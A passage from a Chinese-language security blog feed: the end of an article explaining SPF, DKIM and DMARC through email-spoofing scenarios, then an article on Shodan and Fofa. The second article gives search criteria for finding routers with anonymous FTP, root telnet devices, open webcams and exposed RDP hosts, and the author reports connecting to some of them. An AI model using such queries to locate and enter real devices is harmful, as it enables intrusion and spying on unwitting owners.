Architecture</a>）</p>\n</figcaption></figure></p>\n<hr>\n<h2 id=\"%E9%82%A3%E6%94%BB%E6%93%8A%E6%98%AF%E5%A6%82%E4%BD%95%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E9%82%A3%E6%94%BB%E6%93%8A%E6%98%AF%E5%A6%82%E4%BD%95%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F\">#</a> 那攻擊是如何發生的？</h2>\n<p>討論攻擊前請記住，</p>\n<blockquote>\n<p>SMTP 對信件本身是沒有任何驗證機制的。</p>\n</blockquote>\n<p>你只要可以用一組帳號密碼登入 SMTP server，寄信收信人欄位都任你填。SMTP authentication 只是為了保護 SMTP server 不要成為 open relay 讓任何人都能使用，並沒有保障信件本身的真實性。</p>\n<p>回顧上面的流程，我們來討論三種情境、看看這些攻擊中的『信件』有何不同。</p>\n<p>先假設</p>\n<ul>\n<li>我使用的信箱是：goodboy@gmail.com</li>\n<li>我的 email server 網域是：<a href=\"http://gmail.com\">gmail.com</a></li>\n<li>爺爺用的信箱是：grandpa@outlook.com</li>\n<li>爺爺的 email server 網域是：<a href=\"http://outlook.com\">outlook.com</a></li>\n</ul>\n<p>因此我寄出的信件上，信紙（<code>header.From</code>）與信封袋（<code>smtp.MailFrom</code>）上都會寫著 <a href=\"mailto:goodboy@gmail.com\">goodboy@gmail.com</a>。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%80\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%80\">#</a> 情境一</h3>\n<p>今天我的月光族表弟想要模仿我寄信給爺爺跟他要零用錢，他可以自己架起一個 email server，然後偽造一封信紙（<code>header.From</code>）與信封袋（<code>smtp.MailFrom</code>）上均寫著 <a href=\"mailto:goodboy@gmail.com\">goodboy@gmail.com</a> 的信件並寄出。爺爺的 email server 看到這封信不疑有他就送進爺爺的信箱裡，導致爺爺成功被騙，轉了一筆錢給表弟。單純從 SMTP 機制來看，<a href=\"http://outlook.com\">outlook.com</a> 眼中的信件寫著來自 <a href=\"http://gmail.com\">gmail.com</a>，那就姑且相信他！</p>\n<p>為了防範這種假冒寄信人的攻擊，2014 年 4 月 RFC 7208 正式提出一套名為 <strong>Sender Policy Framework（SPF）</strong> 的電子郵件驗證機制。這個機制的原理就是要求每個網域發一筆 DNS 紀錄，其中記載著這個網域所授權的 email server 的 IP 位置，也就是</p>\n<blockquote>\n<p>SPF：昭告天下『這些 IP 位置是我信任且核可的信件來源』</p>\n</blockquote>\n<p>當收件方 email server 要進行驗證時，MDA 就會去查詢 <code>smtp.MailFrom</code>這個網域的 DNS 紀錄，然後檢查此信件的來源 IP 是否在 SPF 紀錄中。</p>\n<p>下圖是一筆合法的 SPF 紀錄，裡面表列了允許寄信的 IP 位置，並且用 -all 宣告『除了前列 IP 之外一律拒絕』。其實 SPF 有非常多種設定，我們下一篇再談。</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/spf.png\" /><figcaption><p>SPF record（取自 維基百科）</p>\n</figcaption></figure></p>\n<p>你可以在信件的原始資訊裡看到 SPF 的驗證結果，收信方的 email server（<a href=\"http://protection.outlook.com\">protection.outlook.com</a>）在確定 IP 為此 domain 的合法寄信人後，就會給出 PASS 的結果。</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/spf-result.png\" /><figcaption><p>SPF 驗證結果</p>\n</figcaption></figure></p>\n<p>如果今天 <a href=\"http://gmail.com\">gmail.com</a> 設置了 SPF 紀錄，那爺爺的 email server 在驗證時就會發現表弟所用的自架 email server 沒有在列表裡找到對應的 IP ，因此判斷為驗證失敗，成功擋下這個詐騙攻擊。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%BA%8C\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%BA%8C\">#</a> 情境二</h3>\n<p>表弟發現攻擊失敗，只好另尋他法。他靈光一閃，發現雖然不能假冒 <a href=\"http://gmail.com\">gmail.com</a> 寄信，那他可以攔截我寄給爺爺的信，然後把裡面的欄位跟資訊改掉，這樣就可以冒充我的身份又通過 SPF 驗證啦！於是表弟竄改我的信件，把內容改成零用錢請求，又成功騙到爺爺了。</p>\n<p>為了防範情境二的這種攻擊，2011 年首次提出的 RFC 6376（後來又在 RFC 8301 與 RFC 8463 修訂）定義了 <strong>DomainKeys Identified Mail（DKIM）</strong> 這個機制。</p>\n<blockquote>\n<p>DKIM：使用數位簽章的概念來防止郵件偽造與竄改，透過公私鑰加密驗證的特性來確保訊息的完整與真實性。</p>\n</blockquote>\n<p>寄信方的 email server 會產生一組公私鑰，公鑰會用 DNS 紀錄發佈出去讓收信方可以用來解密。在寄信時使用私鑰加密 header 的某些欄位與 body，並將產生的雜湊（hash）做為簽章附上，此簽章稱為 DKIM signature。要加密的欄位由 email server 指定，不過必須包含 <code>header.From</code>（否則寄件人的身份就沒有保障啦）。</p>\n<p>收信的 email server 進行驗證時，如同 SPF，MDA 會去查詢寄信網域的 DNS 紀錄，找到對應的公鑰後解密簽章內容來比對是否一致。</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/dkim.png\" /><figcaption><p>公鑰（取自 維基百科）</p>\n</figcaption></figure></p>\n<p>簽章如下圖所示，標籤中 <code>v</code> 為版本、<code>a</code> 代表加密方式。<code>d</code> <code>s</code> <code>q</code> 三者一起用來查詢公鑰，表示查詢域名為 <code>&lt;selector&gt;._domainkey.&lt;domain&gt;</code>（圖中就是 <code>brisbane._domainkey.example.net</code>）的 DNS TXT 紀錄。<code>h</code> 代表指定的header 欄位，加密後的結果會放在 <code>b</code>，而 <code>bh</code>（body hash）則是 body 本身經過雜湊後的結果。</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/dkim-signature.png\" /><figcaption><p>DKIM signature（取自 維基百科）</p>\n</figcaption></figure></p>\n<p>如果今天 <a href=\"http://gmail.com\">gmail.com</a> 設置了 DKIM 紀錄，那爺爺的 email server 在驗證時就會發現表弟竄改完的信件跟數位簽章解密的結果不符，因此判斷為驗證失敗，爺爺再度逃脫表弟的暗算。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%89\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%89\">#</a> 情境三</h3>\n<p>表弟拿不到零用錢，很是挫敗。於是他絞盡腦汁終於想到：既然我不能仿冒 <a href=\"http://gmail.com\">gmail.com</a> 也不能攔截真的信件，那我就自己架一個 email server、申請一個合法網域 <a href=\"http://cousin.com\">cousin.com</a> ，然後寄一封信紙（<code>header.From</code>）上寫 <a href=\"mailto:goodboy@gmail.com\">goodboy@gmail.com</a> 的信給爺爺就好啦！雖然信封袋（<code>smtp.MailFrom</code>）上寫的是 <a href=\"http://cousin.com\">cousin.com</a>，但反正爺爺在 outlook 裡看到的也只有 <code>header.From</code>，他哪知道不是真的從 <a href=\"http://gmail.com\">gmail.com</a> 來的。而且，不管是 SPF 還是 DKIM 驗證的都是 <code>smtp.MailFrom</code> 的網域，我本來就是 <a href=\"http://cousin.com\">cousin.com</a> 又沒造假，休想擋我財路！</p>\n<p>哎呀，表弟想的真有道理。</p>\n<p>不過好在 2015 年 3 月時 RFC 7489 出現，提出了一個可以保護爺爺的方法，名為 <strong>Domain-based Message Authentication, Reporting and Conformance（DMARC）</strong></p>\n<blockquote>\n<p>DMARC 結合了 SPF 與 DKIM，形成三人聯防，缺一不可，同時強化信紙與信封袋的一致性。</p>\n</blockquote>\n<p>DMARC 主要有兩個功能，其一是指示了當 SPF 與 DKIM 驗證失敗時該採取的行為，稱為 policy；第二則是確保信紙與信封袋上標示的寄件人來自同一個網域（也就是比對<code>header.From</code>跟<code>smtp.MailFrom</code>），稱為 alignment。</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/dmarc.png\" /><figcaption><p>DMARC record（取自 <a href=\"http://bbc.com\">bbc.com</a> 的紀錄）</p>\n</figcaption></figure></p>\n<p>以上面這個 DMARC 紀錄為例，必要的標籤為 <code>p</code>（policy），可能的值有：</p>\n<ul>\n<li><code>reject</code>：最嚴格的設定，表示 SPF 與 DKIM 驗證失敗的信一律回絕或直接捨棄</li>\n<li><code>quarantine</code>：隔離，實際處理方法因 email server 而異，可能是放在 email server 上的隔離區域等待視察（例如微軟的 email server 有 quarantine center），或是被歸類到垃圾郵件中並加註警戒標籤（例如 gmail 的處理方式）。</li>\n<li><code>none</code>：最寬鬆的設定，表示不做特別處理，僅是觀察（monitor），實際處理方法因 email server 而異，有可能進入一般信箱也可能歸類到垃圾郵件。</li>\n</ul>\n<p>而定義 alignment 的標籤為 <code>aspf</code> 與 <code>adkim</code>，分別對應 SPF 與 DKIM。以 SPF 來說是比對 <code>header.From</code> 的網域與 <code>smtp.MailFrom</code> 的網域；以 DKIM 來說是比對 <code>header.From</code> 與 DKIM signature 中 <code>d</code> 標籤的網域（例如前面圖中藍色字體的 <a href=\"http://example.net\">example.net</a>）。</p>\n<p>可能的值有：</p>\n<ul>\n<li><code>s</code>（strict）：嚴格檢查，比對的兩個網域必須完全</li>\n<li><code>r</code>（relaxed）：寬鬆檢查，比對的兩個網域只要 base domain 相同即可，亦即可為主網域與子網域的關係</li>\n</ul>\n<p>DMARC 甚至很貼心的附贈回報功能，你可以在 DMARC 紀錄指定信箱，則收信方的 email server 會每天整理並寄送一份報告到這個信箱，告訴你昨天信件驗證的狀況，包含驗證失敗的信的 trace 資訊與驗證結果。</p>\n<p>你也可以在每一封信的原始資訊中看見驗證結果：</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/dmarc-result.png\" /><figcaption><p>DMARC 驗證結果</p>\n</figcaption></figure></p>\n<p>如果今天 <a href=\"http://gmail.com\">gmail.com</a> 設置了 SPF、DKIM、DMARC 紀錄，那爺爺的 email server 在驗證時就會發現雖然表弟的 SPF、DKIM 驗證通過了，但是<code>header.From</code>寫的 <a href=\"http://gmail.com\">gmail.com</a> 跟<code>smtp.MailFrom</code>還有 DKIM signature 中 <code>d</code> 標籤寫的 <a href=\"http://cousin.com\">cousin.com</a> 對不起來，因此判斷為驗證失敗，爺爺因此又平安度過了一天！</p>\n<hr>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>讀到這裡，大家是否更加了解對 email security 有哪些威脅與防護機制了呢？我們從一封郵件的旅程介紹傳輸過程中的各種角色與職責，也透過三個情境讓大家認識 SPF、DKIM、DMARC 這些防護的用意與效果。有了這三劍客，我們就不用擔心信件被篡改、仿造、或是從未經授權的地方寄出了。近來 email security 意識抬頭，DMARC 也名列 Gartner 十大資安主題排行榜喔！</p>\n<p>不過其實這些機制還有很多不足的地方，例如：中繼 email server 是可以冒充的嗎？是誰控制的？如果 <code>smtp.MailFrom</code> 跟 <code>header.From</code> 不同的時候（例如合理使用 forwarding 功能）不就完蛋了嗎？在沒有這些機制以前是如何防治釣魚的；有了三劍客以後還有哪些機制可以補強呢？</p>\n<p>這些耐人尋味的問題，我們留待之後更深入探討。下一篇，我們先來看看三劍客到底如何設置，以及有哪些容易出錯的小地方～</p>\n<p>附帶一提，為了讓使用者可以更輕易的從寄信人的頭貼辨識出是不是『正身』，有另一個叫做 BIMI 的機制是用來驗證頭貼的哦！不過目前 BIMI 還不是很普及，有興趣的朋友可以再去了解。</p>\n<h3 id=\"references%3A\"><a class=\"direct-link\" href=\"#references%3A\">#</a> References:</h3>\n<ol>\n<li><a href=\"https://bbiw.net/specifications/draft-crocker-email-arch-03.html#Users\">Internet Mail Architecture</a></li>\n<li><a href=\"https://afreshcloud.com/sysadmin/mail-terminology-mta-mua-msa-mda-smtp-dkim-spf-dmarc\">Mail terminology</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7208\">SPF RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6376#section-5\">DKIM RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7489\">DMARC RFC</a></li>\n<li><a href=\"https://dmarc.org/\">DMARC.org</a></li>\n<li><a href=\"https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/\">Gartner</a></li>\n</ol>\n",
      "date_published": "2021-07-02T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/shodan-fofa/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/shodan-fofa/",
      "title": "駭客起手式 : Shodan &amp; Fofa",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<p>處於資訊爆炸時代，遇到問題的第一步通常就是去 Google 一下，駭客們當然也是這樣想，不過除了 Google Hacking 以外駭客有更專門的搜尋引擎。</p>\n<p>本文會先簡單介紹一下駭客常用的搜尋引擎，重點則放在實際案例說明與分享，看一下免費用戶可以做到什麼程度的攻擊，最後討論一下如何避免被找到，打不過駭客難道還躲不起 ?</p>\n<h2 id=\"%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9\"><a class=\"direct-link\" href=\"#%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9\">#</a> 工具介紹</h2>\n<p>提到駭客搜尋引擎，有資安背景的朋友第一個會想到的就是大名鼎鼎的 Shodan，但本文除了介紹老牌的 Shodan 之外還要介紹另一個後起之秀 Fofa，就像我們覺得 IE 或 Safari 不順手的時候就會改用 Chrome 或 Firefox一樣，駭客也會嘗試用不同的方法來找到攻擊目標。</p>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__gX36EdhP1jdHBn6tWpMG7g.png\" alt=\"\"></p>\n<h3 id=\"1.-%E7%B0%A1%E4%BB%8B\"><a class=\"direct-link\" href=\"#1.-%E7%B0%A1%E4%BB%8B\">#</a> 1. 簡介</h3>\n<p>Shodan 是聯網裝置的搜尋引擎，從網站主機到各種 IOT 設備都可以在上面找到，背後有無數台爬蟲伺服器 24 小時在收集全世界的資料，雖然這個網站的初衷是讓使用者檢查自己的設備或服務是否暴露在外網，但駭客們利用搜尋規則從 Shodan 的資料庫中快速找出有弱點的設備並攻擊，攻擊能影響範圍直接提升到了世界級，所以稱 Shodan 為最危險的搜尋引擎一點也不過分。</p>\n<h3 id=\"2.-%E6%90%9C%E5%B0%8B%E8%A6%8F%E5%89%87-%3A\"><a class=\"direct-link\" href=\"#2.-%E6%90%9C%E5%B0%8B%E8%A6%8F%E5%89%87-%3A\">#</a> 2. 搜尋規則 :</h3>\n<p>規則分為 10 大類，最常用的是 General，其他類別是針對特定領域的搜尋，而且有些需要付費會員才可使用，後面會舉一些實際應用的例子。</p>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__q9RtyVHUj4IJ4uivxn5NNw.png\" alt=\"\"></p>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__xrdSmu1pLtoImh3Ab____fCg.png\" alt=\"\"></p>\n<h3 id=\"1.-%E7%B0%A1%E4%BB%8B-%3A\"><a class=\"direct-link\" href=\"#1.-%E7%B0%A1%E4%BB%8B-%3A\">#</a> 1. 簡介 :</h3>\n<p>Fofa 是中國資安廠商白帽匯推出的搜尋引擎，擁有不遜於 Shodan 的龐大資料庫，能夠快速進行聯網裝置匹配，進行漏洞影響範圍分析、應用分佈統計、應用流行度等。</p>\n<h3 id=\"2.-%E6%90%9C%E5%B0%8B%E8%A6%8F%E5%89%87-%3A-2\"><a class=\"direct-link\" href=\"#2.-%E6%90%9C%E5%B0%8B%E8%A6%8F%E5%89%87-%3A-2\">#</a> 2. 搜尋規則 :</h3>\n<p>這邊為了方便之後進行比較，用了類似 Shodan 的方式來將 Fofa 的規則分類，也可看出 Fofa 將重點放在網站相關的搜尋，而且多了一些分析用的規則，像是時間限制、數量統計等，一樣有部分規則付費用戶才能使用。</p>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__zlEjdhzf6j30K4MS1PqQLA.png\" alt=\"\"></p>\n<h2 id=\"%E5%AF%A6%E4%BE%8B%E5%88%86%E4%BA%AB\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E4%BE%8B%E5%88%86%E4%BA%AB\">#</a> 實例分享</h2>\n<p>這邊會先分享幾種真實的攻擊案例，讓大家體驗一下當駭客的感覺，同時比較一下兩種工具找到的結果數量，然後再分享幾種各工具特有的查詢案例，請注意過程中請避免蓄意破壞，造成的影響一律自行承擔。</p>\n<h3 id=\"%E6%A1%88%E4%BE%8B-1-%3A-%E6%AA%94%E6%A1%88%E5%88%86%E4%BA%AB%E4%BC%BA%E6%9C%8D%E5%99%A8-(ftp)\"><a class=\"direct-link\" href=\"#%E6%A1%88%E4%BE%8B-1-%3A-%E6%AA%94%E6%A1%88%E5%88%86%E4%BA%AB%E4%BC%BA%E6%9C%8D%E5%99%A8-(ftp)\">#</a> 案例 1 : 檔案分享伺服器 (FTP)</h3>\n<h4 id=\"%E9%A7%AD%E5%AE%A2-%3A\"><a class=\"direct-link\" href=\"#%E9%A7%AD%E5%AE%A2-%3A\">#</a> 駭客 :</h4>\n<p>硬碟空間不夠了，拿別人的來頂一下，順便丟個後門上去。</p>\n<h4 id=\"%E8%AA%AA%E6%98%8E-%3A\"><a class=\"direct-link\" href=\"#%E8%AA%AA%E6%98%8E-%3A\">#</a> 說明 :</h4>\n<p>ASUS 型號為 RT-AC66U 的路由器有支援 FTP Server 的功能，問題出在於該 設備開放匿名登入，而且匿名使用者竟然有上傳與下載的權限，所以只要找到後誰都可以使用，駭客還可以藉此打進內網，攻擊有連到該台路由器上的設備。</p>\n<h4 id=\"%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A\"><a class=\"direct-link\" href=\"#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A\">#</a> 搜尋條件 :</h4>\n<ol>\n<li>Port : 21</li>\n<li>回應內容包含 : RT-AC66R</li>\n<li>回應內容排除 : 530 (排除禁用匿名登入的設備)</li>\n</ol>\n<h4 id=\"shodan-%3A-11-%E7%AD%86%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#shodan-%3A-11-%E7%AD%86%E7%B5%90%E6%9E%9C\">#</a> Shodan : 11 筆結果</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__2CX2MOE5o2IXsXP9D__R__aA.png\" alt=\"\"></p>\n<h4 id=\"fofa-%3A-33-%E7%AD%86%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#fofa-%3A-33-%E7%AD%86%E7%B5%90%E6%9E%9C\">#</a> Fofa : 33 筆結果</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__KOu4aEsUhDrMC43U6C4Zww.png\" alt=\"\"></p>\n<h4 id=\"%E9%A9%97%E8%AD%89-%3A-%E9%80%A3%E6%8E%A5%E5%88%B0-shodan-%E6%90%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E4%B8%AD%E7%9A%84-ftp-server\"><a class=\"direct-link\" href=\"#%E9%A9%97%E8%AD%89-%3A-%E9%80%A3%E6%8E%A5%E5%88%B0-shodan-%E6%90%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E4%B8%AD%E7%9A%84-ftp-server\">#</a> 驗證 : 連接到 Shodan 搜索結果中的 FTP Server</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__fn__pwtV47j3h44FFR__v47Q.png\" alt=\"\"></p>\n<h3 id=\"%E6%A1%88%E4%BE%8B-2-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(telnet)\"><a class=\"direct-link\" href=\"#%E6%A1%88%E4%BE%8B-2-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(telnet)\">#</a> 案例 2 : 遠端控制 (Telnet)</h3>\n<h4 id=\"%E9%A7%AD%E5%AE%A2-%3A-2\"><a class=\"direct-link\" href=\"#%E9%A7%AD%E5%AE%A2-%3A-2\">#</a> 駭客 :</h4>\n<p>用自己的電腦幹大事怕被發現，那用別人的不就好了。</p>\n<h4 id=\"%E8%AA%AA%E6%98%8E-%3A-2\"><a class=\"direct-link\" href=\"#%E8%AA%AA%E6%98%8E-%3A-2\">#</a> 說明 :</h4>\n<p>有台型號 p750(沒查出是誰家的)的設備開啟了 Telnet Server，登入不需要帳密而且一進去就有 Root 權限，對駭客來說根本是送分題。</p>\n<h4 id=\"%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-2\"><a class=\"direct-link\" href=\"#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-2\">#</a> 搜尋條件 :</h4>\n<ol>\n<li>Port : 23</li>\n<li>回應內容包含 : p750</li>\n<li>回應內容包含 : root@</li>\n</ol>\n<h4 id=\"shodan-%3A-11-%E7%AD%86%E7%B5%90%E6%9E%9C-2\"><a class=\"direct-link\" href=\"#shodan-%3A-11-%E7%AD%86%E7%B5%90%E6%9E%9C-2\">#</a> Shodan : 11 筆結果</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__SO9q00Z9x5c1FI__IgBS7ng.png\" alt=\"\"></p>\n<h4 id=\"fofa-%3A-89-%E7%AD%86%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#fofa-%3A-89-%E7%AD%86%E7%B5%90%E6%9E%9C\">#</a> Fofa : 89 筆結果</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__NGGLiD__gKlvmcKbLktDl4w.png\" alt=\"\"></p>\n<h4 id=\"%E9%A9%97%E8%AD%89-%3A-%E9%80%A3%E6%8E%A5%E5%88%B0-fofa-%E6%90%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E4%B8%AD%E7%9A%84-telnet-server\"><a class=\"direct-link\" href=\"#%E9%A9%97%E8%AD%89-%3A-%E9%80%A3%E6%8E%A5%E5%88%B0-fofa-%E6%90%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E4%B8%AD%E7%9A%84-telnet-server\">#</a> 驗證 : 連接到 Fofa 搜索結果中的 Telnet Server</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__myf23vGvuE0YRKFXRs3EFA.png\" alt=\"\"></p>\n<h3 id=\"%E6%A1%88%E4%BE%8B-3-%3A-%E7%B6%B2%E8%B7%AF%E6%94%9D%E5%BD%B1%E6%A9%9F\"><a class=\"direct-link\" href=\"#%E6%A1%88%E4%BE%8B-3-%3A-%E7%B6%B2%E8%B7%AF%E6%94%9D%E5%BD%B1%E6%A9%9F\">#</a> 案例 3 : 網路攝影機</h3>\n<h4 id=\"%E9%A7%AD%E5%AE%A2-%3A-3\"><a class=\"direct-link\" href=\"#%E9%A7%AD%E5%AE%A2-%3A-3\">#</a> 駭客 :</h4>\n<p>我無聊想看看別人在幹嘛。</p>\n<h4 id=\"%E8%AA%AA%E6%98%8E-%3A-3\"><a class=\"direct-link\" href=\"#%E8%AA%AA%E6%98%8E-%3A-3\">#</a> 說明 :</h4>\n<p>webcamXP 是整合了 HTTP 網頁伺服器功能的 WebCam 網路攝影機伺服器軟體，藉由它，您可以將網路攝影機所拍攝的內容即時分享給網路上的任何人，包含駭客，另外這類型的搜尋加上地區條件時會有奇效。</p>\n<h4 id=\"%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-3\"><a class=\"direct-link\" href=\"#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-3\">#</a> 搜尋條件 :</h4>\n<ol>\n<li>Server : webcamXP 5</li>\n<li>回應內容不包含 : 360 (排除 honeypot(註1) 中的回應內容)</li>\n</ol>\n<h4 id=\"shodan-%3A-239-%E7%AD%86%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#shodan-%3A-239-%E7%AD%86%E7%B5%90%E6%9E%9C\">#</a> Shodan : 239 筆結果</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__lLn3bhqi4v4wl20CHRHw__g.png\" alt=\"\"></p>\n<h4 id=\"fofa-%3A-1718-%E7%AD%86%E7%B5%90%E6%9E%9C-(950%E5%80%8B%E8%A8%AD%E5%82%99)\"><a class=\"direct-link\" href=\"#fofa-%3A-1718-%E7%AD%86%E7%B5%90%E6%9E%9C-(950%E5%80%8B%E8%A8%AD%E5%82%99)\">#</a> Fofa : 1718 筆結果 (950個設備)</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__HwqfAOCXyAhnA83xUkUSeQ.png\" alt=\"\"></p>\n<h4 id=\"%E9%A9%97%E8%AD%89-%3A-%E5%BE%9E-fofa-%E7%9A%84%E7%B5%90%E6%9E%9C%E4%B8%AD%E6%89%BE%E4%B8%80%E5%80%8B%E5%8F%B0%E7%81%A3%E7%9A%84%E7%B6%B2%E8%B7%AF%E6%94%9D%E5%BD%B1%E6%A9%9F\"><a class=\"direct-link\" href=\"#%E9%A9%97%E8%AD%89-%3A-%E5%BE%9E-fofa-%E7%9A%84%E7%B5%90%E6%9E%9C%E4%B8%AD%E6%89%BE%E4%B8%80%E5%80%8B%E5%8F%B0%E7%81%A3%E7%9A%84%E7%B6%B2%E8%B7%AF%E6%94%9D%E5%BD%B1%E6%A9%9F\">#</a> 驗證 : 從 Fofa 的結果中找一個台灣的網路攝影機</h4>\n<p>(在防疫時期後面的朋友到碧潭玩還不戴口罩，I got you !)</p>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__8ESIlmgyrF5ijsMHOO76kA.png\" alt=\"\"></p>\n<h3 id=\"%E6%A1%88%E4%BE%8B-4-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(windows-rdp)\"><a class=\"direct-link\" href=\"#%E6%A1%88%E4%BE%8B-4-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(windows-rdp)\">#</a> 案例 4 : 遠端控制 (Windows RDP)</h3>\n<h4 id=\"%E9%A7%AD%E5%AE%A2-%3A-4\"><a class=\"direct-link\" href=\"#%E9%A7%AD%E5%AE%A2-%3A-4\">#</a> 駭客 :</h4>\n<p>我想找人幫我挖礦，而且電腦有顯卡才挖的快。</p>\n<h4 id=\"%E8%AA%AA%E6%98%8E-%3A-4\"><a class=\"direct-link\" href=\"#%E8%AA%AA%E6%98%8E-%3A-4\">#</a> 說明 :</h4>\n<p>這項測試用到了 Shodan 獨有的功能 Screenshot，故案例中只包含 Shodan 的結果。RDP(Remote Desktop Protocol) 是 Windows 內建的遠端控制功能，特點之一是會把登入過的使用者帳號顯示出來，這大幅降低了駭客暴力破解難度，配合這個特點增加規則也更好找出容易破解的目標，下圖為典型案例，而且有畫面的話有顯示卡的機會也比較高。</p>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__sfSazc0IKRr__N7za6sQy5g.png\" alt=\"\"></p>\n<h4 id=\"%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-4\"><a class=\"direct-link\" href=\"#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-4\">#</a> 搜尋條件 :</h4>\n<ol>\n<li>Port: 3389</li>\n<li>has_screenshot : true</li>\n</ol>\n<h4 id=\"shodan-%3A-1039052-%E7%AD%86%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#shodan-%3A-1039052-%E7%AD%86%E7%B5%90%E6%9E%9C\">#</a> Shodan : 1039052 筆結果</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__NfjZ8g1tEIzc__CCnxBYytg.png\" alt=\"\"></p>\n<h3 id=\"%E6%A1%88%E4%BE%8B-5%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(windows-rdp)\"><a class=\"direct-link\" href=\"#%E6%A1%88%E4%BE%8B-5%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(windows-rdp)\">#</a> 案例 5: 遠端控制 (Windows RDP)</h3>\n<h4 id=\"%E9%A7%AD%E5%AE%A2-%3A-5\"><a class=\"direct-link\" href=\"#%E9%A7%AD%E5%AE%A2-%3A-5\">#</a> 駭客 :</h4>\n<p>我想找人幫我挖礦，而且我只要最新的電腦。</p>\n<h4 id=\"%E8%AA%AA%E6%98%8E-%3A-5\"><a class=\"direct-link\" href=\"#%E8%AA%AA%E6%98%8E-%3A-5\">#</a> 說明 :</h4>\n<p>這項測試用到 Fofa 獨有的功能 After 跟邏輯判斷式，故案例中只包含 Fofa 的結果。這結果除了拿來攻擊之外也可以用於分析，從結果可以知道今年多了多少台開啟遠端功能的 Windows。</p>\n<h4 id=\"%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-5\"><a class=\"direct-link\" href=\"#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-5\">#</a> 搜尋條件 :</h4>\n<ol>\n<li>Port : 3389</li>\n<li>After : 2021–01–01</li>\n<li>回應內容包含 : Windows 10 或 Windows Server 2012</li>\n</ol>\n<h4 id=\"fofa-%3A-4438635-%E7%AD%86%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#fofa-%3A-4438635-%E7%AD%86%E7%B5%90%E6%9E%9C\">#</a> Fofa : 4438635 筆結果</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__hIcAaYG7rpWfkLzwdI9Xfg.png\" alt=\"\"></p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>雖然案例中只介紹到一小部份的搜尋規則，但可以從這些案例知道搜尋引擎的影響力，這邊整理幾個防範方法與要注意的地方。</p>\n<h4 